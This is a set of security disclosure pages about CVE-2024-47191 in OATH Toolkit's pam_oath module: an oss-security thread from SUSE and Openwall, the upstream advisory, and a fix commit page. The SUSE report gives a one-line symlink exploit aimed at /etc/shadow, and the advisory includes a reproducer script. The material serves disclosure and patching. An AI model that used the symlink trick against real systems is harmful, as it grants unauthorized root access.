**[![Simon Josefsson's avatar](https://secure.gravatar.com/avatar/bbcf4eaca84bcb1c3d191a2d8868291127d072e3ed2cc92e8b835d8a009020d8?s=96&d=identicon "Simon Josefsson")](/jas)
[Simon Josefsson](/jas)**

[Browse files](/oath-toolkit/oath-toolkit/-/tree/3271139989fde35ab0163b558fc29e80c3a280e5)

### Use gnulib's fopen-gnu instead of fopen, for cross-platform fopen(wx).

```

Gnulib branch stable-202401 is used with commit aa0aa87e61.
```

parent
[3235a52f](/oath-toolkit/oath-toolkit/-/commit/3235a52f6b87cd1c5da6508f421ac261f5e33a70)

Loading

Loading

Loading

* [Changes
  3](/oath-toolkit/oath-toolkit/-/commit/3271139989fde35ab0163b558fc29e80c3a280e5)

[Hide whitespace changes](/oath-toolkit/oath-toolkit/-/commit/3271139989fde35ab0163b558fc29e80c3a280e5?action=show&controller=projects%2Fcommit&id=3271139989fde35ab0163b558fc29e80c3a280e5&namespace_id=oath-toolkit&project_id=oath-toolkit&w=1)
[Inline](/oath-toolkit/oath-toolkit/-/commit/3271139989fde35ab0163b558fc29e80c3a280e5?view=inline)
[Side-by-side](/oath-toolkit/oath-toolkit/-/commit/3271139989fde35ab0163b558fc29e80c3a280e5?view=parallel)

Loading

Preview

0%
Loading

Try again

or
attach a new file

.

Cancel

You are about to add
**0
people**
to the discussion. Proceed with caution.

Finish editing this message first!

Save comment

Cancel

Please [register](/users/sign_up?redirect_to_referer=yes) or [sign in](/users/sign_in?redirect_to_referer=yes) to comment



=== Content from www.openwall.com_7d94b3c0_20250111_133254.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](../../../2024/10/16/1) [[next>]](../../../2024/10/18/1) [[<thread-prev]](../../../2024/10/15/7) [[thread-next>]](../../../2024/10/18/1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <ZxDKuqteocmdBDNx@kasco.suse.de>
Date: Thu, 17 Oct 2024 10:28:41 +0200
From: Matthias Gerstner <mgerstner@...e.de>
To: oss-security@...ts.openwall.com
Subject: Re: CVE-2024-47191: Local root exploit in the PAM
 module pam_oath.so

Hi,

On Tue, Oct 15, 2024 at 10:21:35PM +0200, Solar Designer wrote:
> On Tue, Oct 15, 2024 at 03:17:34PM -0400, Demi Marie Obenour wrote:
> > What about opening the path one portion at a time using openat() with
> > O_NOFOLLOW (and, as applicable, O_DIRECTORY),
>
> As I understand, the SUSE patch already does that.

Exactly. The privilege-drop is only an extra hardening. The patch
first attempts to securely determine the ownership of the
oath-usersfile, then drops privileges to the owner of the file for
further processing.

> Both the SUSE and the upstream patch try to do two things at once: drop
> privileges and access files safer.  Maybe I missed, but I think neither
> of you specified whether these two things are intended as required
> complementary parts (and what attacks would work if only one part worked
> as intended) or as defense-in-depth.  You could want to clarify this.

The privilege-drop in our path is defense-in-depth. The file operations
used should be robust on their own already. Dealing with file system
APIs securely is such contexts is quite a complex task as can be seen in
the discussion of the for this bugfix, so adding the extra layer of
dropping privileges makes me feel better about this.

> > I will adjust the patch to contain this and one or two other adjustments
> > and can then share it again here on the list.

An updated version of the patch is attached to this email. As is stated
at the end of the patch description, the following changes have been
made compared to the previously shared version:

- setgroups() is invoked to drop supplementary group membership. Without
  this the forked process wrongly retains the root group membership.
  Since the privilege drop is only an additional hardening measure, the
  original patch should still prove safe.
- the usersfile is checked for additional hard-links; if the link count
  is larger than one, then the file is rejected. This prevents possible
  hard link attacks on the end of the unprivileged user. With the Linux
  kernel sysctl protected_hardlinks set to 1 (the usual default on most
  distributions), this attack will not work either way.
- O_NOCTTY has been added to the open() call of the usersfile. This
  makes this aspect explicit, although the code already checks that the
  file is a regular file, so the situation shouldn't arise in the first
  place.

> > Indeed the patch does not take care of hard link attacks. Our products
> > don't have any supported configuration without protected_hardlinks
> > enabled, so we didn't have this in mind.
> >
> > The change to address this concern should be rather small, though, so I
> > will try to incorporate it in a new version of the patch.
>
> I guess it's checks of st_uid and st_nlink?  There are still some really
> subtle issues like side effects on open() of a device file, which can be
> hard linked too, but privilege dropping should mostly prevent them.  I'd
> also add O_NOCTTY.

In our case it is only a check of st_nlink. This is because we are
dropping privileges to the owner of the file. If one would drop
privileges to the to-be-authenticated user, then a check of st_uid would
be in order as well.

The reason why we accept different ownership of the file is for
increased backward compatibility. The usersfile feature in pam-oath
allows for potentially complex scenarios regarding to the ownership of
the file and it was not previously clearly specified which scenarios are
supported. When only supporting the simple scenario of the usersfile
being located directly beneath the to-be-authenticated user's home
directory, then a lot of things become simpler, as it has been done
in the upstream approach in a couple of aspects.

Best Regards

Matthias

View attachment "[0001-usersfile-fix-potential-security-issues-in-PAM-modul.patch](1/1)" of type "text/plain" (30135 bytes)

Download attachment "[signature.asc](1/2)" of type "application/pgp-signature" (834 bytes)

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.openwall.com_b700d393_20250111_133254.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](3) [[next>]](../../../2024/10/09/1) [[<thread-prev]](2) [[thread-next>]](../../../2024/10/15/1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20241008205659.GA7086@openwall.com>
Date: Tue, 8 Oct 2024 22:56:59 +0200
From: Solar Designer <solar@...nwall.com>
To: Simon Josefsson <simon@...efsson.org>
Cc: oss-security@...ts.openwall.com
Subject: Re: CVE-2024-47191: Local root exploit in the PAM module pam_oath.so

On Tue, Oct 08, 2024 at 08:10:17AM +0200, Simon Josefsson wrote:
> I noticed that that there are Linux-PAM helpers to drop privileges:
>
> <https://github.com/linux-pam/linux-pam/blob/master/libpam/pam_modutil_priv.c#L52>

This currently switches fsuid/fsgid (so for the current thread only),
but uses initgroups() and setgroups() libc functions (so affects all
threads).  Code last modified 4 years ago, which pre-dates our
recognition of the supplementary groups vs. threads problem and its fix
in tcb.  Maybe Linux-PAM should implement a similar change now.

> I have found another implementation of this in yubico-pam:
>
> <https://github.com/Yubico/yubico-pam/blob/master/drop_privs.c>

This currently switches euid/egid/groups, so doesn't try to be MT-safe.

(On Linux, it is also possible to switch euid/egid via direct syscalls
for the current thread only, but there's no point because switching of
fsuid/fsgid is more appropriate for this purpose anyway.)

A couple of nitpicks on your upstream oath-toolkit code:

1. You restore egid/euid in this same order as you set them.  This
unnecessarily introduces an extra temporary state.  I suggest that you
restore them in reverse order, so set egid/euid ... restore euid/egid.
(The SUSE patch doesn't have this "problem".)

2. After uses of asprintf() you first check the pointer for NULL and
only then check the return value.  Strictly speaking, this is undefined
behavior because the pointer may be uninitialized if the return value
indicates an error.  Of course, this shouldn't matter in practice unless
a compiler is aware and deliberately exploits the UB (e.g. optimize
everything out because this is UB anyway) or the environment (hardware
or a software "sanitizer") is such that uninitialized reads are trapped,
but to make it correct I suggest that you simply drop the NULL checks.

> Btw, do you have any thoughts on WHICH user to drop privileges to?  The
> SUSE patch drops privs to the credential file owner.  My patch drops
> privs to the PAM user that is being authenticated.  I think there are
> reasonable arguments for both choices, and for all reasonable
> configurations that I'm aware of, I don't think the choice matters.

Thank you for bringing this up.

I think that for reasonable configurations in absence of attacks this
difference is unimportant, however there are different risks involved.

In particular, I worry that the SUSE approach could be susceptible to
hard link attacks (when the fs.protected_hardlinks sysctl is not set).
Would this allow to overwrite someone else's file (the original issue)
if the user can hard link that file?  I currently don't see why not, so
it's probably a vulnerability.

Would it allow to have the log in process temporarily switch to another
user (of the attacker's choosing)?  This sounds relatively minor.

In general, switching to a user not only drops privileges for file
access, but also potentially exposes the process as that user's.
fsuid/fsgid switching is the safest in this respect (these were meant
just for file access purposes), but with other IDs (depending on which)
there may be extra exposure of the partially privileged log in process
to the user via /proc, kill(), setpriority(), etc. ... but thankfully
and hopefully not also via ptrace() on modern systems anymore.

Alexander

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.nongnu.org_fcb3b91d_20250111_133300.html ===

Â»[Home](index.html)
Â»[News](NEWS.html)
Â»[Download](download.html)
Â»[Documentation](docs.html)
Â Â Â Â Â Â»[oathtool(1)](oathtool.1.html)
Â Â Â Â Â Â»[pskctool(1)](pskctool.1.html)
Â Â Â Â Â Â»[LiboathÂ API](liboath-api/liboath-oath.h.html)
Â Â Â Â Â Â»[PSKC Tutorial](libpskc-api/pskc-tutorial.html)
Â Â Â Â Â Â»[LibpskcÂ API](libpskc-api/pskc-reference.html)
Â Â Â Â Â Â»[pam\_oath](pam_oath.html)
Â»[Contribute](contrib.html)

OATH Toolkit
One-time password components

## OATH Toolkit pam\_oath usersfile `${HOME}` privilege escalation (CVE-2024-47191)

## Security Vulnerability

OATH Toolkit provides two components `liboath` and `pam_oath`.
Pam\_oath is normally run as root and assumes that the `usersfile` path
setting value points to a root-controlled and protected file
containing the OATH secrets (cryptographic HMAC keys) for users.

The documentation suggests using a root-owned `/etc/users.oath` and to
do `chmod go-rw /etc/users.oath` on it. The design assumes that file
permissions are set up to prevent malicious read or writes to the
credential file by unauthorized users. Whether file permissions are
setup correctly or not is not checked by the code.

On every successful authentication, the file is rewritten to prevent
OTP replay attacks. The rewriting logic works by acquiring a POSIX
file lock on a newly created `*.lock` file (in the same directory),
and then writing file content to a newly created `*.new` file (also in
the same directory). File ownership of the new file is set to the
same as the original file. The original usersfile is replaced
atomically with the newly created file.

With the introduction of the `${HOME}` indirection variable in the
usersfile parameter the design assumptions no longer holds. The
feature was added in version 2.6.7 released on 2021-05-01.

A typical setup when `${HOME}` is used in a usersfile value such as
`usersfile=${HOME}/.config/oath.secrets` is to allow users to manage
their own credentials. The file is owned by the user who is
responsible for adding the secret to it, and to set read/write
permissions on the file appropriately.

The security problem is easy to exploit. To demonstrate the
vulnerability with a vulnerable version and configuration, create a
symbolic link `$HOME/.config/oath.secrets.new` that points to a
privileged file such as `/etc/shadow`. After successful login as the
user, `pam_oath`/`liboath` has followed the symbolic link and rewrote
the target file with new updated OATH credentials and sets ownership
of that file to the user. The user is now able to modify
`/etc/shadow`.

We are not aware of any active exploits in the wild of this flaw.

## Affected versions and configurations

OATH Toolkit pam\_oath and liboath version 2.6.7 to version 2.6.11 are
affected. Version 2.6.12 prevents the attack.

The attack requires that the "usersfile" setting has a file or path
component that is in a vulnerable location. The common setup with a
write/read-protected `usersfile=/etc/users.oath` setup is not
vulnerable.

While adminâs may specify a "usersfile" in a world-writeable directory
like `/tmp` we regard that as a configuration error. In most
scenarios, only "usersfile" with `${HOME}` in them should be regarded
as a vulnerable configuration.

One vulnerable setting is `usersfile=/home/joe/.config/system.oath`
giving joe the ability to modify root-owned files, assuming a non-root
user joe with write access to anything below `/home/joe`. This is
somewhat similar to having a system SSH configuration of HostKey
`/home/joe/ssh_hostkey` which we believe is unlikely and also consider
to be a configuration error.

Another example is via the `${USER}` setting as in
`usersfile=/home/${USER}/.config/oath.secrets` giving any non-root
user the ability to control system files, assuming they have write
access to anything below `/home/${USER}`. We have improved the
documentation regarding `${USER}` to be for those settings where
root-controlled per-user files are desired. The intended use of
`${USER}` strings are for setups like
`usersfile=/var/oath/oath.${USER}.secrets` where the files are
per-user but owned by root and have file permissions setup to prevent
read/write from the user. The root-ownership and file permission
should prevent users from being able to reach their OATH credentials
when `${USER}` is used.

The `pam_oath` fix only address configurations that uses `${HOME}` and
not any other vulnerable configurations. The liboath fix prevent
direct attacks via `*.new` and `*.lock` symlinks, but other scenarios
are possible and the input to `oath_authenticate_usersfile()` MUST be
a trusted filenameâââsuitable sanitization is application-dependent.

## Details

The vulnerable code in liboath is inside
`oath_authenticate_usersfile()`, quoting code from version 2.6.11
which can be reviewed here:

<https://gitlab.com/oath-toolkit/oath-toolkit/-/blob/oath-toolkit-2.6.11/liboath/usersfile.c?ref_type=tags#L324>

The lock file is acquired:

```
/* Open lockfile. */
{
  int l;
  l = asprintf (&lockfile, "%s.lock", usersfile);
  if (lockfile == NULL || ((size_t) l) != strlen (usersfile) + 5)
    return OATH_PRINTF_ERROR;
  lockfh = fopen (lockfile, "w");
  if (!lockfh)
    {
      free (lockfile);
      return OATH_FILE_CREATE_ERROR;
    }
}
```

Since `fopen("w")` is used any existing file with the predictable
`*.lock` filename will be opened, including if that file happens to be
a symbolic link that points elsewhere. The code is run as root, so a
symbolic link pointing to confidential files under `/etc` are happily
opened. Note that since "w" is used, the file will be automatically
truncated. So this allows non-root to truncate root-owned files.

Reading on to the `*.new` file handling:

<https://gitlab.com/oath-toolkit/oath-toolkit/-/blob/oath-toolkit-2.6.11/liboath/usersfile.c?ref_type=tags#L360>

```
outfh = fopen (newfilename, "w");
if (!outfh)
  {
    free (newfilename);
    fclose (lockfh);
    free (lockfile);
    return OATH_FILE_CREATE_ERROR;
  }
```

Similarily, this will open a file for writing, and later code will
essentially copy data from the existing file into the new one. This
new file is moved back into the original place.

The PAM module invokes `oath_authenticate_usersfile()` in
`pam_oath.c`, which can be shown here:

<https://gitlab.com/oath-toolkit/oath-toolkit/-/blob/oath-toolkit-2.6.11/pam_oath/pam_oath.c?ref_type=tags#L452>

The code is running as root so it may work on an untrustworthy
filename. The design used to be that adminâs specify a trusted
pathname here, but the `${HOME}` use-case broke this design assumption
and the pathnames should then no longer be considered trusted.

## Solution

Version 2.6.12 contains the following liboath patch to use `fopen(wx)`:

<https://gitlab.com/oath-toolkit/oath-toolkit/-/commit/3235a52f6b87cd1c5da6508f421ac261f5e33a70>

Some non-glibc and non-ISO C11 platforms needs the following patch to
enable gnulibâs `fopen(wx)` workaround:

<https://gitlab.com/oath-toolkit/oath-toolkit/-/commit/3271139989fde35ab0163b558fc29e80c3a280e5>

Then `pam_oath.c` is modified to call seteuid()/setegid() as follows:

<https://gitlab.com/oath-toolkit/oath-toolkit/-/commit/95ef255e6a401949ce3f67609bf8aac2029db418>

A patch that applies cleanly to version 2.6.7 found in Debian 12.x
bookworm is available here:

<https://salsa.debian.org/debian/oath-toolkit/-/blob/debian/bookworm-security/debian/patches/pam_oath-seteuid.patch>

We recommend you to upgrade to version 2.6.12.

If that is unpractical we recommended you to apply the patches on top
of your earlier version.

## Reproducer

Included in the 2.6.12 release is a C program to test if a liboath is
vulnerable or not. It can be built as follows on a system with
liboath properly installed:

```
 git clone https://gitlab.com/oath-toolkit/oath-toolkit.git
 cd oath-toolkit
 git checkout oath-toolkit-2.6.12
 cd liboath/tests
 cc -o tst_fopen-wx tst_fopen-wx.c $(pkg-config --libs --cflags liboath)
 rm -f cve.oath cve.oath.new cve.sshd-config cve.oath.lock
 printf 'HOTP/E/8\tsilver\t4711\t3132333435363738393031323334353637383930313233343536373839303132\n' > cve.oath
 echo my-magic-cookie > cve.sshd-config
 ln -s cve.sshd-config cve.oath.new
./tst_fopen-wx cve.oath silver 670691 4711
```

When invoked on a Trisquel 11 system with liboath0 and liboath-dev
version 2.6.7-3build1 installed, it will print the following:

```
Liboath fopen(wx) bug test for oath.h 2.6.7 liboath.so 2.6.7
FAIL: Liboath VULNERABLE to fopen(wx) bug.
```

To test a particular liboath use LD\_PRELOAD as follows:

```
LD_PRELOAD=/usr/local/lib/x86_64-linux-gnu/liboath.so.0 ./tst_fopen-wx cve.oath silver 670691 4711
```

The liboath/tests/tst\_fopen-wx.sh script can be used to setup and
invoke the C program testing two different vulnerable configurations.

## Related work

The logic for the usersfile handling was inspired by earlier versions
of mod-authn-otp and pam\_google\_authenticator although their modern
design appears to be somewhat different from pam\_oathâs current code.

<https://github.com/archiecobbs/mod-authn-otp>

<https://github.com/google/google-authenticator-libpam/>

While the liboath oath\_authenticate\_usersfile() vulnerability is not a
typical "time-of-check, time-of-use" race condition (since there is no
check happening in the code) it exhibits the same pattern in the code
since fopen(w) is used instead of fopen(wx). Running GitLab semantic
analysis (SAST) on the vulnerable code flagged it as problematic:

<https://gitlab.com/oath-toolkit/oath-toolkit/-/security/vulnerabilities/139535897>

<https://gitlab.com/oath-toolkit/oath-toolkit/-/security/vulnerabilities/139535890>

[https://wiki.sei.cmu.edu/confluence/display/c/FIO45-C.+Avoid+TOCTOU+race+conditions+while+accessing+files](https://wiki.sei.cmu.edu/confluence/display/c/FIO45-C.%2BAvoid%2BTOCTOU%2Brace%2Bconditions%2Bwhile%2Baccessing%2Bfiles)

We have enabled GitLab SAST and Coverity scanning of OATH Toolkit and
will review the findings.

SUSEâs alternative patch and advisory can be found via:

<https://security.opensuse.org/2024/10/04/oath-toolkit-vulnerability.html>

It rely on Linux kernel specific features and uses fork() which was
determined to be contrary to the liboath design, which aims to be
portable to macOS and \*BSD and beyond. This alternative patch may be
used by some vendors, and it is assumed to fix the security problem.

## History

Fabian Vogt reported this issue in private e-mail on 2024-08-08.
Matthias Gerstner reported the issue as a GitLab confidential issue on
2024-08-20. These reports came in during vacation time and were not
read by the maintainer. Salvatore Bonaccorso reached out on
2024-09-29 via SMS, and the progress since then has been tracked in
the bug tracker:

<https://gitlab.com/oath-toolkit/oath-toolkit/-/issues/43>

## Credits

The problem was discovered by Fabian Vogt of SUSE. An initial patch
against liboath was developed by Matthias Gerstner of SUSE Security
Team. An alternative and portable patch to liboath and pam\_oath were
developed by Simon Josefsson.

[![Valid XHTML 1.0](https://www.w3.org/Icons/valid-xhtml10)](https://validator.w3.org/check?uri=referer)
[![Valid CSS!](https://jigsaw.w3.org/css-validator/images/vcss)](https://jigsaw.w3.org/css-validator/check/referer)



=== Content from www.openwall.com_bbb438ae_20250111_133300.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](1) [[next>]](3) [[thread-next>]](../../../2024/10/05/1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <Zv-9gAGM_X7QQShJ@suse.com>
Date: Fri, 4 Oct 2024 12:03:44 +0200
From: Johannes Segitz <jsegitz@...e.de>
To: oss-security@...ts.openwall.com
Subject: CVE-2024-47191: Local root exploit in the PAM module pam_oath.so

Hello list,

this is a report about a local root exploit in the PAM module `pam_oath.so`,
which is shipped as part of the oath-toolkit project [1].

You can also find a rendered HTML version of this report on our blog [5].

The vulnerability was discovered by Fabian Vogt of SUSE, and this report and
attached patch were authored by Matthias Gerstner of the SUSE Security Team.

Introduction
============

oath-toolkit[1] contains libraries and utilities for managing one-time password
(OTP) authentication e.g. as a second factor to password authentication.
Fellow SUSE engineer Fabian Vogt approached our Security Team about the
project's PAM module. A couple of years ago, the module gained a feature which
allows to place the OTP state file (called usersfile) in the home directory of
the to-be-authenticated user. Fabian noticed that the PAM module performs
unsafe file operations in users' home directories. Since PAM stacks typically
run as root, this can easily cause security issues.

The feature in question has been introduced in oath-toolkit version 2.6.7 (via
commit 60d9902b5c [2]). The following report is based on the most recent
oath-toolkit release tag for version 2.6.11.

Vulnerability Details
=====================

The PAM module is typically configured using a PAM stack configuration line
like this:

    auth [user_unknown=ignore success=ok] pam_oath.so usersfile=${HOME}/user.oath window=20

The expansion logic of the path components ${HOME} or ${USER} is part of the
problematic feature that introduced the security issue.

The PAM module invokes a liboath library function called
`oath_authenticate_usersfile()` found in liboath/usersfile.c, which manages
all accesses to the usersfile. Privileges are not dropped, and the function is
not aware of the special privileged PAM context. All file accesses in the
function are naive and follow symlinks. The relevant file operations that are
carried out on successful OTP entry are as follows:

- opening of the usersfile via `fopen()` for reading (usersfile.c:470).
- opening of a lockfile parallel to the usersfile using a filename suffix ".lock" via `fopen()` for writing (usersfile.c:332)
- locking of the lockfile using POSIX advisory locks via `fcntl()` (usersfile.c:350)
- creation of a new usersfile parallel to the old usersfile using a filename suffix ".new" via `fopen()` (usersfile.c:372)
- changing ownership of the new usersfile to the to-be-authenticated user via `fchown()` (usersfile.c:394)
- renaming of the new usersfile to the old usersfile via `rename()` (usersfile.c:411)
- unlinking of the previously created lockfile (usersfile.c:423)

If this happens in a PAM stack running as root and the usersfile is located in
an unprivileged user's home directory, then a simple root exploit is possible
by placing a symlink like this:

    user$ ln -s /etc/shadow $HOME/user.oath.new

This will cause /etc/shadow to be overwritten and its ownership will be
changed to the to-be-authenticated user. The to-be-authenticated user can
obtain full root privileges. No race condition needs to be won and no
pathnames have to be guessed.

Embargo Process and Upstream Communication
==========================================

Fabian Vogt first approached the main upstream author by email. Since we did not
get a reaction for several days, we created a private Gitlab issue in the
upstream project [3], offering coordinated disclosure. There was no reaction,
thus we decided to handle the embargo and bugfix ourselves, since we needed a
fixed `pam_oath` module for our products. We developed a comprehensive patch,
attached to this report and described in "SUSE Bugfix" below.

We requested a CVE from Mitre for this issue and they assigned CVE-2024-47191.

As we were preparing to go public, the upstream author got pinged via private
channels and reacted to our report, preparing an upstream bugfix release
addressing the issue, described in "Upstream Bugfix" below.

Due to time constraints, we have decided to apply our SUSE bugfix to our
products for the time being, until we can evaluate the upstream solution in more
depth.

SUSE Bugfix
===========

We developed the attached patch within SUSE to address the issue. The
situation for the bugfix is more complex than it might look at first, because
many things are unclear or broken in the current source code:

- the PAM module cannot know for sure if the target usersfile is supposed to
  be owned by root or by the to-be-authenticated user, or even some unrelated
  user. The presence of a ${HOME} path element makes it likely that the
  to-be-authenticated user is supposed to own the file. The presence of a
  ${USER} element is not that clear, however.
- the locking mechanism used in the current source code is broken:
  - the usersfile is initially opened for reading and parsed without owning
    the lock (usersfile.c:470). A parallel task can be about to replace this
    file with a new version, thus a lost update can occur.
  - the lock file is unlinked again after the usersfile has been updated
    (usersfile.c:423). This breaks when another task is waiting on the
    now-unlinked lockfile, while a third task arrives, sees no lockfile and
    creates a new one.
- the lockfile is placed in the user's home directory, possibly cluttering it.
  Cases like the home directory being a network file system (NFS, CIFS) would
  need to be considered. The unprivileged user might also prevent the privileged
  PAM stack from obtaining the lock, causing a local denial-of-service.

We decided to develop a patch that takes as many use cases as possible into
account, securing all operations while maintaining backwards compatibility.
With the patch, the usersfile path is safely traversed using the `*at` family
of system calls. Privileges will be dropped to the owner of the usersfile as an
additional security measure. The locking mechanism has been fixed to cover all
accesses to the usersfile. Instead of creating a separate lockfile, the
usersfile itself is used for locking, which avoids cluttering the home
directory. Additional sanity checks are added e.g. world-writable directory
components are denied. The patch employs Linux specific features (e.g. linking
files from /proc/self/fd), thus it no longer works for non-Linux systems. The
patch description and code comments contain more hints about the individual
decisions taken in this patch.

Upstream Bugfix
===============

Upstream developed an alternative solution, designed to be more portable and
cross-platform. This does not take into account all aspects that we considered
in the "SUSE Bugfix", but should be sufficient to fix the specific security
issue described in this report.

This fix has been released in version 2.6.12 of oath-toolkit. Upstream has also
published an associated Security Advisory [4].

Timeline
========

2024-08-08: Fabian Vogt of SUSE sent an email to the main upstream author,
            describing the issue. The SUSE Security Team was involved as well.
2024-08-20: After not receiving any reply by email, we created a private
            GitLab issue [3] describing the vulnerability and offering
            coordinated disclosure.
2024-08-28: SUSE started developing an internal patch for the issue.
2024-09-19: Our internal patch was getting ready for publication. We added a
            comment in the private GitLab issue, granting two final weeks of
            embargo time before we will publish the vulnerability and the patch.
            We also shared the current patch in the issue.
2024-09-19: We requested a CVE for the issue from Mitre.
2024-09-20: Mitre assigned CVE-2024-47191.
2024-09-29: After being pinged via private channels, the main upstream author
            reacted to our communication and started preparing a bugfix release.
2024-10-04: Upstream published release 2.6.12 containing the bugfix.

[1]: <https://gitlab.com/oath-toolkit/oath-toolkit>
[2]: <https://gitlab.com/oath-toolkit/oath-toolkit/-/commit/60d9902b5c20f27e70f8e9c816bfdc0467567e1a>
[3]: <https://gitlab.com/oath-toolkit/oath-toolkit/-/issues/43>
[4]: <https://www.nongnu.org/oath-toolkit/security/CVE-2024-47191/>
[5]: <https://security.opensuse.org/2024/10/04/oath-toolkit-vulnerability.html>

Johannes
--
GPG Key                EE16 6BCE AD56 E034 BFB3  3ADD 7BF7 29D5 E7C8 1FA0
Subkey fingerprint:    250F 43F5 F7CE 6F1E 9C59  4F95 BC27 DD9D 2CC4 FD66
SUSE Software Solutions Germany GmbH, Frankenstraße 146, 90461 Nürnberg, Germany
Geschäftsführer: Ivo Totev, Andrew McDonald, Werner Knoblich (HRB 36809, AG Nürnberg)

View attachment "[0001-usersfile-fix-potential-security-issues-in-PAM-modul.patch](2/1)" of type "text/x-patch" (28797 bytes)

Download attachment "[signature.asc](2/2)" of type "application/pgp-signature" (834 bytes)

```

